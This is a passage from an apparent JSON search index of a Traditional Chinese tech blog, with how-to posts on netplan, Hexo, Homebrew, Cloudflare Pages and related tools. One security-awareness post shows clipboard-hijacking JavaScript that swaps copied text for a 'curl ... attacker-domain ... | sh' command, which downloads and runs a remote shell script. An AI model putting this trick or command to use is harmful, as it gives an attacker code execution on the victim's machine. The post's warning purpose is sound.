登入就會自動登進去\n","date":"2023-02-10T14:35:35+08:00","image":"https://camo.githubusercontent.com/0517b8b479b59ff711930e51861faf2154aa54524503cf5de4b7ef506e1119d1/68747470733a2f2f7374617469632e7265717561726b732e696f2f6c6f676f2f77696b696a732d66756c6c2e737667","permalink":"https://zonego.tw/post/wikijs-keyckoak/","title":"設定 WikiJS 使用 Keyckoak 做身分認證"},{"content":"Cloudflare Page 使用上跟 GitHub Page 類似\n就差在 GitHub Page 只能用靜態網站檔案，用框架產生的靜態網站就必須先編好才能推上去儲藏庫\nCloudflare Page 可以支援編譯\n設定步驟 官方文件 https://developers.cloudflare.com/pages/\n簡單步驟總結：\n在 GitHub 或 GitLab 建立網頁用的儲藏庫 (repository)\nCloudflare page 連結 GitHub 或 GitLab\n在 Cloudflare 設定網站用的 domain name\n完成🎉\n設定 Git 儲藏庫 首先到 GitHub 或 GitLab 建立網頁用的儲藏庫 (就基本的 git 操作，這邊就不多作教學)\n網站內容跟 GitHub Page 一樣，只要是靜態網站都可以，不管是直接寫或是用框架產生都可以\n比 GitHub Page 好的一點是，可以直接推送框架的程式上去，部署時編譯\n但免費版有限制，所以我還是習慣推送已經編好的上去\nGitHub Page 跟 Cloudflare page 也不需要太糾結要用哪個，反正都免費都可以先用看看\n例如本網站的內容就是用 Hexo 框架產生，先推送到 GitHub Page，Cloudflare page 用同個儲藏庫當來源\n在 https://zonelin.github.io/ 也可以找到本站\nCloudflare 新增 page 專案 登入 Cloudflare 在 page 設定內新增一個專案　登入 GitHub 或 GitLab 選擇要用的存儲庫 repository\n設定要觸發抓取的分支 (建議把部署跟開發中做不同的分支)\n如果是想要推送後，再用框架產生靜態網頁可以調整這邊設定\n點儲存部屬 Save and Deploy 後會開始從 Git 存儲庫抓程式碼下來編譯\n如果是靜態頁面，就只有抓下來 (畢竟我們的 Build setting 是空的)\n完成會自動給一個自動分配的網址，例如本站就是 blog-public-3io.pages.dev\n需要自訂網址可以到專案的 Custom domains 設定，免費版有使用上限 免費版限制\n到這邊就完成了🎉\n用 Cloudflare 還有個好處，Cloudflare 會自動套 Web Analytics\n免費版使用限制 根據官方文件\n每個帳號可以件幾個網站專案、預覽板本好像沒限制\n建置 免費版能從 GitHub 抓程式碼重新建置每個月500次，建置時間不得過20分鐘\n推送程式碼到 GitHub 也會觸發重新建置\n所以我習慣在本機把 hexo 建制好，再推送到 GitHub，省編譯時間\nDomains 最多 10 個自訂 domain\n檔案 單一個網站專案，最多到 2 萬個檔案\n單一檔案、素材最大 25MB\n有放圖片要注意下容量\nHeaders 最多 100 header 規則\n重導向規則 最多 100 個\n","date":"2023-02-10T12:39:40+08:00","image":"https://zonego.tw/post/cloudflare-page/cloudflare-page_hu_bedd3835fcc65bb8.png","permalink":"https://zonego.tw/post/cloudflare-page/","title":"Cloudflare Page 架站教學"},{"content":"Hitomi Downloader 是一個開源的影音下載工具，支援各大網站的影音下載\n目前只有 windows 的版本\nGitHub https://github.com/KurtBestor/Hitomi-Downloader\n下載位置 https://github.com/KurtBestor/Hitomi-Downloader/releases\n詳細支援網站請看 https://github.com/KurtBestor/Hitomi-Downloader#supported-sites\n除了 Youtube 等影音網站還支援 Pixiv\nHitomi Downloader 底層用近乎萬能的 yt-dlp 作為影音下載器\nyt-dlp 支援的網站，Hitomi Downloader 基本就能下載\n套個官方的示範圖\n除了一般單片下載之外，還支援下載整個播放清單\n","date":"2023-01-19T10:59:09+08:00","image":"https://zonego.tw/post/hitomi-downloader/hitomi_hu_5817da870fa955ee.png","permalink":"https://zonego.tw/post/hitomi-downloader/","title":"Hitomi Downloader"},{"content":"Ubuntu 20.04 後改用 netplan 作為指令網路設定工具\n設定檔 netplan 設定檔預設放在 /etc/netplan/00-installer-config.yaml\n修改及套用需要 root 權限\n查看網卡代號 使用 ip addr 指令可以列出網卡資訊，跑出來的結果像這樣\nbash 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \\$ ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens18: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether xx:xx:xx:xx:xx:xx brd xx:xx:xx:xx:xx:xx altname enp0s18 inet 192.168.1.xx/24 brd 172.16.0.255 scope global ens18 valid_lft forever preferred_lft forever inet6 0000::0000:0000:0000:0000/64 scope link valid_lft forever preferred_lft forever 編號 2 後面的 ens18 就是網卡代號\n我的電腦只有裝一張網卡結果才會只到編號 2，如果有多張網卡會接續列在下面\n如果這台機器是 docker host，可能會有一大堆虛擬網卡\n接下來就是開始編輯設定檔\n使用 nano 編輯器修改設定檔\nbash 1 nano /etc/netplan/50-cloud-init.yaml 使用 DHCP 自動設定 IP \u0026lt;/\u0026gt; yaml 📄 /etc/netplan/50-cloud-init.yaml 1 2 3 4 5 6 7 8 network: version: 2 renderer: networkd ethernets: # 下面 ens18 改成你的網卡代號 ens18: dhcp4: true # 如果有多張網卡，設定繼續加在下面 設定固定 IP \u0026lt;/\u0026gt; yaml 📄 /etc/netplan/50-cloud-init.yaml 1 2 3 4 5 6 7 8 9 10 11 12 network: version: 2 ethernets: ens18: addresses: # 設定固定 IP - 192.168.1.2/24 # 預設閘道器 gateway4: 192.168.1.1 # 預設 DNS nameservers: addresses: [8.8.8.8, 1.1.1.1] 固定 IP 中 /24 代表子網遮罩，相當於 255.255.255.0\n如果不會換算，可以參考 IPv4 子網計算機\nhttps://damaha-labo.site/converter/zh-Hant/IT/CalcSubnetMask 通常沒特殊需求的話，家用路由器的子網遮罩都是用 /24 255.255.255.0\n在 ubuntu 22.04 新版的 Netplan 中， gateway4 這個設定已被棄用\n新版的設定檔長這樣\n\u0026lt;/\u0026gt; yaml 📄 /etc/netplan/50-cloud-init.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 network: version: 2 ethernets: ens18: addresses: # 設定固定 IP - 192.168.1.2/24 # 預設 DNS nameservers: addresses: [8.8.8.8, 1.1.1.1] # 預設閘道器 routes: - to: default via: 192.168.1.1 預設路由的設定，改成可以設定多個預設閘道器 (Gateway)\n\u0026lt;/\u0026gt; yaml 📄 /etc/netplan/50-cloud-init.yaml 1 2 3 4 5 6 7 routes: - to: default via: 10.0.0.1 metric: 200 - to: default via: 11.0.0.1 metric: 300 其中 metric 代表優先權重，值越小越優先使用\n設定 WIFI 連線 這邊同樣是用 Netplan 來修改設定，如果可以裝套件的狀況或是已經裝了 network-manager\n可以用 nmcli 工具來設定比較方便\n取得 Wifi 網卡代號 bash 1 2 \\$ ls /sys/class/net enp0s25 lo wlp3s0 通常在 Ubuntu 22.04 中 Wifi 網卡代號通常是 wlan0 或是 wlp3s0\n在設定檔下面加上 Wifi 的部分即可\n\u0026lt;/\u0026gt; yaml 📄 /etc/netplan/50-cloud-init.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 network: ethernets: eth0: dhcp4: true optional: true version: 2 wifis: wlp3s0: optional: true access-points: \u0026#34;SSID-NAME-HERE\u0026#34;: password: \u0026#34;PASSWORD-HERE\u0026#34; dhcp4: true 至於要怎麼找附近可用的熱點\u0026hellip;\n如果要用指令的方式查，推薦用 nmcli 設定即可，就不需要用 netplan 打一堆字了\n保存、套用設定 範例使用的 nano 編輯器，儲存按法：\nCtrl + X 離開 ＝\u0026gt; Ctrl + Y 確認保存\n保存完後，用下面指令測試設定檔有無格式錯誤\nbash 1 netplan try 確定網路沒問題，在 120 秒內按 Enter 確定套用。\n這招可以避免設定固定 IP 時設定錯誤斷網，畢竟很懶的跑去機器旁邊重新設定。\n如果想要直接套用，不用再另外檢查，可以用 netplan apply\nbash 1 netplan apply 檢查是否設定成功\nbash 1 ip addr 看一下網卡有沒有配到 IP\n如果你的 Raspberry Pi 也是裝 Ubuntu，網路設定也是這樣修改\n參考資料 Netplan 設定範例 https://netplan.io/examples Configure WiFi Connections https://ubuntu.com/core/docs/networkmanager/configure-wifi-connections Photo by Gabriel Heinzer on Unsplash\n","date":"2022-12-25T18:44:10+08:00","image":"https://zonego.tw/post/ubuntu-netplan/ubuntu_hu_ec734029c824268a.jpg","permalink":"https://zonego.tw/post/ubuntu-netplan/","title":"Ubuntu netplan 設定網路連線"},{"content":"404 頁面，也就是找不到網頁時的暫時頁面。雖然大部分網頁伺服器已經提供預設的 404 頁面，但公版有些蠻醜的。\n新增頁面 方法一：使用 md 檔讓 Hexo 生成 簡單省事的做法就是在 source 資料夾內新增 404.md ，依照一般貼文的寫法，寫完讓 Hexo 產生頁面就好。\n方法二：使用一般 html 檔 事先準備好 404.html 的靜態網頁，放到 source 資料夾內。\n例如使用範本 https://freefrontend.com/html-css-404-page-templates/\n放入後修改 _config.yml 設定跳渲染 404.html \\(可參考 [Hexo 指定文件跳過渲染](/2021/12/15/hexo-skip/)\\)\n\u0026lt;/\u0026gt; yml 📄 _config.yml 1 2 3 4 ... skip_render: - 404.html 一般檔案如 css 與 js 可以直接放著在 source 就好，Hexo 渲染網頁時會回直接搬到 public 資料夾內。\n套用 404 頁面 我們的網站有提供 404 頁面，但設定重導向就是網頁伺服器的工作了。\n靜態網頁服務 GitHub Page, CloudFlare Page 等免費的靜態網站服務，預設都會抓 source 資料夾下的 404.html 檔案作為 404 頁面。\nnginx 預設網站設定檔通常是 /etc/nginx/conf.d/default.conf\n📄 default.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # The default server. server { listen 80 default_server; server_name everythingelse; error_page 404 /404.html; # Everything is a 404 location / { return 404; #return the code 404 } # link the code to the file location = /404.html { # 可以把頁面位置改成這樣，Hexo 部署時的對應位置就是 public 資料夾 root /var/www/nginx/www/; } } apache 在網站資料夾內的 /var/www/html/.htaccess 檔案內加入\n📄 .htaccess 1 ErrorDocument 404 /404.html 或是編輯 /etc/apache2/sites-enabled/000-default.com 修改 VirtualHost\n📄 000-default.com 1 2 3 4 5 \u0026lt;VirtualHost\u0026gt; ... ErrorDocument 404 /404.html ... \u0026lt;/VirtualHost\u0026gt; 關於 SEO Google, Bing 等搜尋引擎，會將較合適的網站優先推到搜尋結果上。\n為了讓排名靠前一些， SEO（搜尋引擎優化）就變得十分重要，尤其是要增加曝光度。\nSEO 其中一項是需使用自訂的 404 頁面，也因此網站就會影響到網站的廣告費。\n參考資料 github page 404 setting apache custum 404 page nginx 404 page ","date":"2022-12-21T10:56:21+08:00","image":"https://zonego.tw/post/hexo-404-page/hexo_hu_8391813d28afa5b.jpg","permalink":"https://zonego.tw/post/hexo-404-page/","title":"Hexo 設定 404 頁面"},{"content":"Linux 環境變數種類 永久的：需要修改配置檔案，變數永久生效。 臨時的：使用export命令宣告即可，變數在關閉shell或關機時失效。 Mac 跟 Linux 都是由 Unix 發展的作業系統，在部分操作邏輯都相同，包含環境變數。\n看目前的環境變數 使用 env 指令\n\u0026lt;/\u0026gt; termainal 1 2 3 4 5 user@MacBook-Pro ~ % env USER=XXXX HOME=/Users/XXXXXX SHELL=/bin/zsh ... 如果已知環境變數的名稱，可以使用 echo 查看，例如要看 SHELL\n\u003e_ terminal 1 2 user@MacBook-Pro ~ % echo $SHELL /bin/zsh 設定環境變數 臨時性修改，重開機後就必須再做一次 用 export 指令，設定 PATH 變數為例 (下面指令二選一)\n\u003e_ terminal 1 2 export PATH=\u0026#34;$PATH\u0026#34;:/home/bin export PATH=${PATH}:/home/bin 輸入之後可以使用export指令來查看環境變數是否有輸入進去。\n永久性修改，需重開機之後才會有作用 修改 profile profile的路徑是在 \u0026ldquo;/etc/profile\u0026rdquo;，打開後在裡面加入 (下面指令二選一)\n📄 /etc/profile 1 2 export PATH=\u0026#34;$PATH\u0026#34;:/home/bin export PATH=${PATH}:/home/bin 修改.bashrc .bashrc的路徑是在\u0026quot;/home/username/.bashrc\u0026quot;，在檔案最後面加入 (下面指令二選一)\n📄 /home/username/.bashrc 1 2 export PATH=\u0026#34;$PATH\u0026#34;:/home/bin export PATH=${PATH}:/home/bin 參考來源 阿輝的零碎筆記 Linux環境變數的設定、檢視、刪除 Photo by Gabriel Heinzer on Unsplash\n","date":"2022-11-29T20:02:04+08:00","image":"https://zonego.tw/post/linux-path/ubuntu_hu_ec734029c824268a.jpg","permalink":"https://zonego.tw/post/linux-path/","title":"linux 環境變數及 Path 設定"},{"content":"Homebrew 是 Mac 上常用的第三方套件管理器，可以用來安裝 wget 等 Linux 常用但 Mac 沒有的程式。\n雖然主要是面向 Mac 的程式，但 Linux 也可以用。\n安裝 官方有提供安裝腳本\n\u003e_ terminal 1 /bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; 不需要用 sudo 安裝\n裝完之後可以用 brew help 檢查是否安裝成功\n使用方法 \u003e_ terminal 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 user@MacBook-Pro ~ % brew help Example usage: brew search TEXT|/REGEX/ brew info [FORMULA|CASK...] brew install FORMULA|CASK... brew update brew upgrade [FORMULA|CASK...] brew uninstall FORMULA|CASK... brew list [FORMULA|CASK...] Troubleshooting: brew config brew doctor brew install --verbose --debug FORMULA|CASK Contributing: brew create URL [--no-fetch] brew edit [FORMULA|CASK...] Further help: brew commands brew help [COMMAND] man brew https://docs.brew.sh 基本上就是發現缺什麼套件，先去官網找看看 https://brew.sh/zh-tw，有的話就下指令安裝\n安裝 wget\n\u003e_ terminal 1 brew install wget 再來就是更新了\n\u003e_ terminal 1 brew update 安裝問題 如果下載途中意外中斷 \\(例如 Mac 休眠自動斷線\\) ，重跑時可能會出現下面問題\nerror: Not a valid ref: refs/remotes/origin/master\nfatal: ambiguous argument \u0026lsquo;refs/remotes/origin/master\u0026rsquo;: unknown revision or path not in the working tree.\n碰到這個問題，只要先把舊的刪掉再重裝就可以了\n\u003e_ terminal 1 /bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)\u0026#34; ","date":"2022-10-24T17:59:16+08:00","image":"https://zonego.tw/post/homebrew/homebrew_hu_671bacc2d7f8baaa.jpeg","permalink":"https://zonego.tw/post/homebrew/","title":"Mac 上的套件管理系統 Homebrew"},{"content":"相信在用 MAC 的大家或多或少都會遇到要用 Windows 專用軟體的情況。\n稍微在網路上爬過比較多人推薦的是 Parallel Desktop ，可惜它是付費軟體。\nVMWare 到今天只有推了一個測試版的 Fusion Player ，害我都已經想用 PC + 遠桌面解決了。\n還好閒逛時找到這套 UTM 虛擬機\n官網 https://mac.getutm.app/\n介面有中文，只要有用過虛擬機的朋友，一定能簡單上手。絕對不是因為我懶得寫\nUTM 的底層是用 QEMU ，代表在MAC上的虛擬機跑膩了，還可以簡單移植硬碟檔到 Proxmox VE 上執行。\n不得不說 M1 MAC 的續航力實在是太香了。\n更新，在 MAC 上用虛擬機還是非常噴電，大概只有用遠端桌面能解決了\nPhoto by Taylor Vick on Unsplash\n","date":"2022-10-05T09:07:13+08:00","image":"https://zonego.tw/post/utm-virtual-machine/servers_hu_3295e1e24af70327.jpg","permalink":"https://zonego.tw/post/utm-virtual-machine/","title":"Apple Silicon MAC上的虛擬機軟體"},{"content":"注意複製貼上內容 我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容!\n複製這個指令試試看\nsudo apt update\n把剛剛複製的貼這邊試試看吧\n中間的奧秘就是用 JavaScript 達到改寫複製的內容\n\u0026lt;/\u0026gt; js 1 2 3 4 document.getElementById(\u0026#39;copy\u0026#39;).addEventListener(\u0026#39;copy\u0026#39;, function(e) { e.clipboardData.setData(\u0026#39;text/plain\u0026#39;, \u0026#39;curl http://attacker-domain:8000/shell.sh | sh\\n\u0026#39;); e.preventDefault(); }); 所以，在貼上之前記得先貼到記事本檢查，不要直接貼到終端機使用\n來源 https://www.wizer-training.com/blog/copy-paste\n","date":"2022-04-27T19:44:03+08:00","permalink":"https://zonego.tw/post/copy-past/","title":"注意複製貼上內容"},{"content":"大家平常要測網路速度都會想到 Ookla 的 Speedtest.net\n在簡單的網路環境內，Speedtest 就可以完成測速的工作，但如果我要測試內網速度呢?\n網路環境 在測試之前，我們先了解網路速度到底是在測甚麼。\n一般家用的網路架構大概如圖，由中華電信這些電信商(ISP)提供網際網路連線(雲圖示)，之後在你家裝一台路由器，讓家裡的設備可以透過它上網。\n我們平常用的 Speedtest.net 其實就是在測家裡到網際網路的連線速度。\n只是因為網路架構相當簡單，所以電腦、手機等終端的連線速度就等於連網際網路的速度。\n若是有在玩自架服務 homelab 的朋友網路架構絕對沒那麼簡單，可能比較像這張圖\n在接到網際網路(後面以外網代稱)之前，接到路由器 Router 架設區域網路(後面以內網代稱)。\n然後連交換機 Switch 去串接各終端設備和伺服器、監視器等\n所以如果我們要測試內網裡面電腦連伺服器的速度，如下圖。Speedtest.net 當然就測不出來了\nOpenSpeedTest 講了這麼多前提，主要就是要紹可以自己架設的 OpenSpeedTest\n官網 DockerHub 只要把它架在自己的伺服器上，就可以像在用 Speedtest.net 一樣測試內網的網速🎉\n這邊是官方那邊的 DEMO (沒錯它可以直接嵌在你的網頁內)\nProvided by OpenSpeedtest.com \u0026lt;/\u0026gt; html 1 2 3 4 5 6 7 \u0026lt;div style=\u0026#34;text-align:right;\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;min-height:360px;\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;width:100%;height:0;padding-bottom:50%;position:relative;\u0026#34;\u0026gt;\u0026lt;iframe style=\u0026#34;border:none;position:absolute;top:0;left:0;width:100%;height:100%;min-height:360px;border:none;overflow:hidden !important;\u0026#34; src=\u0026#34;//openspeedtest.com/Get-widget.php\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;Provided by \u0026lt;a href=\u0026#34;http://openspeedtest.com\u0026#34;\u0026gt;OpenSpeedtest.com\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; 安裝 OpenSpeedTest OpenSpeedTest 大致分為3種安裝方式\n安裝程式包 Docker 從原始碼手動架設 程式包 官方打包好的安裝檔在這邊下載頁可以找到\n支援主流的作業系統 Windows, Mac, Linux 之外，連 Android 跟 IOS 都有 (可能用來測熱點性能吧?)\n點 Start Server 後就可以連 👉 給的網址測速了\nDocker \u003e_ terminal 1 docker run --restart=unless-stopped --name openspeedtest -d -p 3000:3000 -p 3001:3001 openspeedtest/latest 啟動後連 http://YOUR-IP:3000 或 https://YOUR-IP:3001 測速\n原始碼安裝 首先到 Github 下載或 clone 原始碼\n準備好 Nginx ，套用openspeedtest 預設 nginx 設定\n然後將下載好的OpenSpeedTest原始碼，放到 Nginx 的網頁資料夾就可以用了\n推薦還是用 Docker 安裝，簡單省事，如果需要整合進你的網站再用原始碼安裝\nPhoto by Chris Liverani on Unsplash\n","date":"2022-03-15T18:46:58+08:00","image":"https://zonego.tw/post/speedtest/speed-meter_hu_75895de80bf2ac83.jpg","permalink":"https://zonego.tw/post/speedtest/","title":"OpenSpeedTest 純HTML5的內網測速工具"},{"content":"去年大概在10月左右買了 ASUS VivoBook S14 (S433)，起初用著都很正常\n12月開始出現偶發的藍屏崩潰、網卡抓不到等現象\n自從大學開始，電腦都是自己組以來，不知道已經有幾年沒看過這麼頻繁出現的藍屏\u0026hellip;\n爬文後才發現，大概是因為晶片短缺的原因，ASUS 這幾個月的筆電網卡會採用替代品，而不是之前常用的 Intel AX210\nIntel 他們家的網卡跟 SSD 可是出了名的穩定耐用\n趁著缺貨前趕快從某皮買一張 AX210 來換\n警告! 自行更換網卡可能會破保固，換之前請想好\n事前準備 Intel AX210 網卡一張\n星型螺絲起子 建議可以買XX合1那種螺絲起子組\n尖頭鑷子\n拆機 參考別人的拆機影片，把背蓋打開就看的到網卡了\n紅框的地方就是網卡，天線用鑷子會比較好拆裝\n換下的網卡 AW-XB468NF\n這張卡請保留好，之後要如果送修\n需要在送修前先換回去，以免保固出問題\n都裝好了才發現忘記拍照\u0026hellip;\n","date":"2022-01-17T20:20:36+08:00","permalink":"https://zonego.tw/post/vivobook-netcard/","title":"ASUS VivoBook S14 S433 更換無線網卡"},{"content":"設定環境變數 開啟設定 \u0026gt; 系統 \u0026gt; 關於 \u0026gt; 裝置規格 進階系統相關\n設定 Path 預設位置 Windows預設應用程式 path 位置\n1 %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps 題外話 Linux 的預設位置在\n1 /usr/local/bin 為甚麼要設定 Path 設定路徑可以簡化找程式的時間\n例如下載完 youtube-dl.exe 放在下載資料夾內時\n在指令介面，可以直接打程式名，不用附帶前面的路徑\n\u0026lt;/\u0026gt; powershell 1 2 3 4 5 # 未設定路徑 C:\\Users\\th533\\Downloads\\youtube-dl.exe ... # 有設定路徑 youtube-dl.exe ... 新增、編輯 Path ","date":"2022-01-07T10:52:56+08:00","permalink":"https://zonego.tw/post/windows-path/","title":"Windows 11 環境變數及 Path 設定"},{"content":"Drone CI 是一個可以自行架設的 CI (Continuous Integration) 軟體\n使用 CI 的用意就是為了，能在寫完程式時，自動測試、編譯與發佈程式。\n關於怎麼架設改天再寫一篇教學。 Google一下應該就很多教學了\ndrone-git-push 回來本篇主題\n這次我的需求是在 Drone 的流程內，測試或編譯完程式後以 git 推送到不同的儲藏庫\n其實就是要產生網站檔案後，推送到 GitHub 方便用 GitHub Page 或是 Cloudflare Page\n在 Drone CI 中可以用 drone-git-push 做到\n這次遇到的問題有2個 害我為了找問題多花很多時間\n儲存庫辨識失敗 錯誤訊息:\nterminal parse \u0026quot;git@github.com:user/repo.git\u0026quot;: first path segment in URL cannot contain colon\u0026quot;\n照原本文件寫的 .drone.yml 大概是長這樣\n\u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 7 - name: deploy git image: appleboy/drone-git-push settings: branch: main remote: git@github.com:user/repo.git force: false commit: true 參考GitHub討論區的解決方法\n使用緊急修補的 image remote 改用字串 \u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 7 - name: deploy git image: appleboy/drone-git-push:0.2.0-linux-amd64 settings: branch: main remote: \u0026#34;git@github.com:user/repo.git\u0026#34; force: false commit: true SSH Key 讀取失敗 由於資安的關係， SSH KEY 不可以跟著程式碼推送到儲存庫，更不可能放明碼在設定檔中\n在 Drone CI 要改用 secret 的功能\n.drone.yml 大概長這樣\n\u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 - name: deploy git image: appleboy/drone-git-push:0.2.0-linux-amd64 settings: branch: main ssh_key: from_secret: githubkey 另外在 Drone CI 的 WebUI 上添加 Secret\n將 private key 的內文貼進去\n然後就碰到問題了\n錯誤訊息:\nterminal Load key \u0026ldquo;/root/.ssh/id_rsa\u0026rdquo;: invalid format\n參考GitHub討論區的解決方法\n產生的 SSH key 需要改用 PEM \u003e_ terminal 1 ssh-keygen -t rsa -b 4096 -C \u0026#34;your_email@example.com\u0026#34; -m PEM 換完 KEY 甚麼問題都沒了🎉\n","date":"2022-01-06T20:15:54+08:00","image":"https://zonego.tw/post/drone-git-push/DroneCI_hu_f452da106152f38b.jpg","permalink":"https://zonego.tw/post/drone-git-push/","title":"drone-git-push 踩雷心得"},{"content":"Hexo 在編譯時，會將source下的md以及html檔，都套用主題後產生成html\n若有些頁面原本就是設計好的，不要套用主題的話，就要改設定去跳過了\n修改設定 詳細請看 Hexo 的官方文件\n開啟 _config.yml 修改 skip_render 欄位可以設定渲染時要跳過的文件\n這邊的設定與 exclude 不同，用 exclude 排除後，\n在編譯時不會將原檔複製到 public 內，包括佈署時也是。\n跳過單一文件 若要跳過 source 下的 test.html\n\u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 7 8 skip_render: test.html # 或是 skip_render: [test.html] # 或是 skip_render: - test.html 若是跳過 source/abc 下的 test.html，就寫 abc/test.html\n路徑不要寫成絕對位置，這邊的路徑都寫 source 下的相對位置\n跳過多個文件 \u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 skip_render: [test.html, test2.html] # 或是 skip_render: - test.html - test2.html 使用規則命名 skip_render 欄位可以用 glob 表達式表示符合規則的檔名\n例如:\n\u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 跳過所有 test 開頭的檔案 skip_render: - test* # 跳過所有 test 開頭的 html 檔案 skip_render: - test*.html # 跳過所有 abc 資料夾內的檔案 skip_render: - abc/* # 跳過所有 abc 資料夾內的檔案包含目錄 skip_render: - abc/** 參考資料 https://hexo.io/zh-tw/docs/configuration.html\nhttps://iitii.github.io/2019/02/15/1/\n","date":"2021-12-15T09:41:37+08:00","image":"https://zonego.tw/post/hexo-skip/hexo_hu_8391813d28afa5b.jpg","permalink":"https://zonego.tw/post/hexo-skip/","title":"Hexo 指定文件跳過渲染"},{"content":"RSS(Really Simple Syndication) 是用 xml 定義的標準格式，用來把新聞、部落格文章或是 Podcast 更新資訊彙整到一個地方\n衍生出的格式有 Atom, Json Feed 等格式\n既然都做部落格了，當然要提供訂閱功能。(加減多點流量)\n在 Hexo 內可以使用 Hexo-Feed 插件幫我們產生 RSS, Atom 還有 Json Feed 的檔案\nHexo-feed GitHub\n安裝 需要版本 Hexo 4.X+\nNodeJS 12+\n安裝指令 \u003e_ terminal 1 npm install hexo-feed --save-dev 製作模板檔案 新增對應的模板檔案\nRSS: themes/layout/template/rss.ejs\n\u0026lt;/\u0026gt; html 📄 rss.ejs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;\u0026lt;%= config.title %\u0026gt;\u0026lt;%= tag ? ` • Posts by \u0026#34;${tag}\u0026#34; tag` : \u0026#39;\u0026#39; %\u0026gt;\u0026lt;%= category ? ` • Posts by \u0026#34;${category}\u0026#34; category` : \u0026#39;\u0026#39; %\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;\u0026lt;%= config.url %\u0026gt;\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;\u0026lt;%= config.description %\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;language\u0026gt;\u0026lt;%= config.language %\u0026gt;\u0026lt;/language\u0026gt; \u0026lt;pubDate\u0026gt;\u0026lt;%= moment(lastBuildDate).locale(\u0026#39;en\u0026#39;).format(\u0026#39;ddd, DD MMM YYYY HH:mm:ss ZZ\u0026#39;) %\u0026gt;\u0026lt;/pubDate\u0026gt; \u0026lt;lastBuildDate\u0026gt;\u0026lt;%= moment(lastBuildDate).locale(\u0026#39;en\u0026#39;).format(\u0026#39;ddd, DD MMM YYYY HH:mm:ss ZZ\u0026#39;) %\u0026gt;\u0026lt;/lastBuildDate\u0026gt; \u0026lt;%_ for (const { name } of (tags || [])) { _%\u0026gt; \u0026lt;category\u0026gt;\u0026lt;%= name %\u0026gt;\u0026lt;/category\u0026gt; \u0026lt;%_ } _%\u0026gt; \u0026lt;%_ for (const post of posts) { _%\u0026gt; \u0026lt;item\u0026gt; \u0026lt;guid isPermalink=\u0026#34;true\u0026#34;\u0026gt;\u0026lt;%= post.permalink %\u0026gt;\u0026lt;/guid\u0026gt; \u0026lt;title\u0026gt;\u0026lt;%= post.title %\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;\u0026lt;%= post.permalink %\u0026gt;\u0026lt;/link\u0026gt; \u0026lt;%_ for (const tag of (post.tags ? post.tags.toArray() : [])) { _%\u0026gt; \u0026lt;category\u0026gt;\u0026lt;%= tag.name %\u0026gt;\u0026lt;/category\u0026gt; \u0026lt;%_ } _%\u0026gt; \u0026lt;pubDate\u0026gt;\u0026lt;%= moment(post.date).locale(\u0026#39;en\u0026#39;).format(\u0026#39;ddd, DD MMM YYYY HH:mm:ss ZZ\u0026#39;) %\u0026gt;\u0026lt;/pubDate\u0026gt; \u0026lt;description\u0026gt;\u0026lt;![CDATA[ \u0026lt;%= post.content %\u0026gt; ]]\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;%_ } _%\u0026gt; \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; ATOM: themes/layout/template/atom.ejs\n\u0026lt;/\u0026gt; html 📄 atom.ejs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;feed xmlns=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;id\u0026gt;\u0026lt;%= config.url %\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;title\u0026gt;\u0026lt;%= config.title %\u0026gt;\u0026lt;%= tag ? ` • Posts by \u0026#34;${tag}\u0026#34; tag` : \u0026#39;\u0026#39; %\u0026gt;\u0026lt;%= category ? ` • Posts by \u0026#34;${category}\u0026#34; category` : \u0026#39;\u0026#39; %\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;\u0026lt;%= config.url %\u0026gt;\u0026#34; /\u0026gt; \u0026lt;updated\u0026gt;\u0026lt;%= moment(lastBuildDate).toISOString() %\u0026gt;\u0026lt;/updated\u0026gt; \u0026lt;%_ for (const { name } of (tags || [])) { _%\u0026gt; \u0026lt;category term=\u0026#34;\u0026lt;%= name %\u0026gt;\u0026#34; /\u0026gt; \u0026lt;%_ } _%\u0026gt; 